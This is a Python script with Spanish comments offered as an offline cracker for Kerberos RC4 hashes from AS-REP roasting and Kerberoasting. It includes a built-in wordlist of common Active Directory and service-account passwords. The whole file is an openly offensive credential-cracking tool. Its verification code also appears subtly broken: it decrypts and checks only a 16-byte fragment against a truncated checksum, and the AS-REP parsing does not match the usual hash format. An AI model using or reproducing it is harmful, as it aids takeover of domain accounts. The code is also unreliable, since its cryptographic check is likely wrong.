#!/usr/bin/env python3
"""
crack-kerberos.py — Offline cracker para hashes Kerberos RC4 (etype 23).

Soporta:
  - $krb5asrep$23$  (AS-REP Roasting — GetNPUsers.py)
  - $krb5tgs$23$    (Kerberoasting  — GetUserSPNs.py)

Uso:
  python3 crack-kerberos.py --hash-file hashes.txt --wordlist wordlist.txt
  python3 crack-kerberos.py --hash-file hashes.txt --builtin-wordlist
"""
import argparse
import hashlib
import hmac
import struct
import sys
import time
from pathlib import Path

try:
    from Crypto.Cipher import ARC4
except ImportError:
    print("[!] pip install pycryptodome", file=sys.stderr)
    sys.exit(1)


# ── Wordlist integrada (contraseñas AD comunes) ──────────────────────────────

BUILTIN_WORDLIST = [
    # Patrones corporativos comunes
    "Password1", "Password123", "Password123!", "Password@123",
    "Welcome1", "Welcome123", "Welcome@1",
    "Admin123", "Admin@123", "Admin1234",
    "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
    "Summer2025!", "Winter2025!", "Spring2025!", "Fall2025!",
    "Summer2026!", "Winter2026!",
    "Corp2024!", "Corp2025!", "Corp2026!",
    "Company1!", "Company@2024",
    "Monday1!", "January1!", "January2024!",
    # Cuentas de servicio
    "Service1!", "Service@123", "Svc2024!", "Svc@2024",
    "Backup2024!", "Backup@123", "BackupAdmin1!",
    "SqlAdmin1!", "SqlServer@1", "Mssql@2024",
    "WebAdmin1!", "WebServer@1", "Http@2024",
    # Clásicas
    "P@ssw0rd", "P@ssword1", "Pa$$w0rd", "Passw0rd!",
    "Qwerty123!", "Letmein1!", "Changeme1!",
    "123456789", "1234567890",
    "abc123ABC!", "Test1234!",
    # Lab / pentest
    "lab2024!", "Lab@2024", "PentestLab1!", "Purple@Lab1",
    "AuditPassword123!", "Audit@2024",
    "corp2024!", "Corp.local1!", "Corp@local",
    # Nombre del servicio como contraseña
    "svc-backup", "svc-web", "svc-sql",
    "svcbackup1!", "svcweb1!", "svcsql1!",
    "Backup@Corp1", "Web@Corp1", "Sql@Corp1",
]


# ── Parser de hashes ──────────────────────────────────────────────────────────

def parse_hash_line(line: str) -> dict | None:
    """
    Parsea una línea en formato hashcat:
      $krb5asrep$23$user@DOMAIN$<hex_checksum+ciphertext>
      $krb5tgs$23$*user*DOMAIN*service*<hex>$<hex>
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    if "$krb5asrep$23$" in line:
        hash_type = "asrep"
    elif "$krb5tgs$23$" in line:
        hash_type = "tgs"
    else:
        return None

    # Extraer usuario
    try:
        if hash_type == "asrep":
            # $krb5asrep$23$user@DOMAIN$HASH
            after = line.split("$krb5asrep$23$")[1]
            user = after.split("$")[0]
            hex_part = after.split("$")[1]
        else:
            # $krb5tgs$23$*user*DOMAIN*spn*$checksum$ciphertext
            parts = line.split("$")
            # Format: ['', 'krb5tgs', '23', '*user*DOMAIN*spn*', hex1, hex2]
            star_part = parts[3] if len(parts) > 3 else ""
            user = star_part.strip("*").split("*")[0]
            hex_part = parts[4] + parts[5] if len(parts) >= 6 else parts[4]
    except (IndexError, ValueError):
        return None

    try:
        raw = bytes.fromhex(hex_part)
    except ValueError:
        return None

    if len(raw) < 24:
        return None

    return {
        "type":       hash_type,
        "user":       user,
        "checksum":   raw[:16],
        "ciphertext": raw[16:],
        "raw_hash":   line,
    }


# ── NT hash ───────────────────────────────────────────────────────────────────

def nt_hash(password: str) -> bytes:
    return hashlib.new("md4", password.encode("utf-16-le")).digest()


# ── RC4-HMAC cracker (etype 23) ───────────────────────────────────────────────

def try_crack_rc4(entry: dict, password: str) -> bool:
    """
    Verifica si 'password' produce el checksum correcto para el hash RC4-HMAC.
    """
    nt = nt_hash(password)
    # K1 = HMAC-MD5(NT, msg_type=2 for TGS, 8 for AS-REP)
    msg_type = 8 if entry["type"] == "asrep" else 2
    k1 = hmac.new(nt, struct.pack("<I", msg_type), hashlib.md5).digest()
    k2 = hmac.new(k1, entry["checksum"], hashlib.md5).digest()
    cipher = ARC4.new(k2)
    decrypted = cipher.decrypt(entry["ciphertext"][:16])
    computed = hmac.new(k1, decrypted, hashlib.md5).digest()
    return computed[:8] == entry["checksum"][:8]


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="Offline Kerberos RC4 hash cracker")
    ap.add_argument("--hash-file",       required=True,  help="Archivo con hashes (uno por línea)")
    ap.add_argument("--wordlist",        default=None,   help="Ruta a wordlist externa")
    ap.add_argument("--builtin-wordlist",action="store_true", help="Usar wordlist integrada")
    ap.add_argument("--output",          default=None,   help="Guardar contraseñas crackeadas en archivo")
    args = ap.parse_args()

    # Cargar hashes
    hash_file = Path(args.hash_file)
    if not hash_file.exists():
        print(f"[!] Archivo no encontrado: {hash_file}", file=sys.stderr)
        sys.exit(1)

    entries = []
    for line in hash_file.read_text(errors="replace").splitlines():
        e = parse_hash_line(line)
        if e:
            entries.append(e)

    if not entries:
        print("[!] No se encontraron hashes válidos en el archivo.")
        sys.exit(0)

    print(f"[*] {len(entries)} hash(es) cargados para crackear")

    # Cargar wordlist
    if args.wordlist:
        wl = Path(args.wordlist).read_text(errors="replace").splitlines()
    elif args.builtin_wordlist:
        wl = BUILTIN_WORDLIST
    else:
        print("[!] Especifica --wordlist o --builtin-wordlist", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Probando {len(wl)} contraseñas...")

    cracked   = {}
    remaining = list(entries)
    start     = time.time()

    for i, password in enumerate(wl):
        if not remaining:
            break
        for entry in list(remaining):
            if try_crack_rc4(entry, password):
                cracked[entry["user"]] = password
                remaining.remove(entry)
                elapsed = time.time() - start
                print(f"  [CRACKED] {entry['type'].upper()} | {entry['user']} : {password}  [{elapsed:.1f}s]")

    elapsed = time.time() - start
    total   = len(entries)
    found   = len(cracked)

    print()
    print("=" * 60)
    print(f" Resultados: {found}/{total} crackeados en {elapsed:.1f}s")
    print("=" * 60)

    for user, pwd in cracked.items():
        print(f"  {user} : {pwd}")

    if not cracked:
        print("  [—] Ninguna contraseña encontrada con esta wordlist.")
        print("      Prueba una wordlist más grande (rockyou, SecLists).")

    # Guardar output
    if args.output:
        out = Path(args.output)
        lines = [f"{user}:{pwd}" for user, pwd in cracked.items()]
        if not cracked:
            lines = ["# No passwords cracked"]
        out.write_text("\n".join(lines) + "\n")
        print(f"\n[*] Guardado en: {out}")

    # Exit code: 0 si crackeó algo, 1 si no
    sys.exit(0 if cracked else 1)


if __name__ == "__main__":
    main()
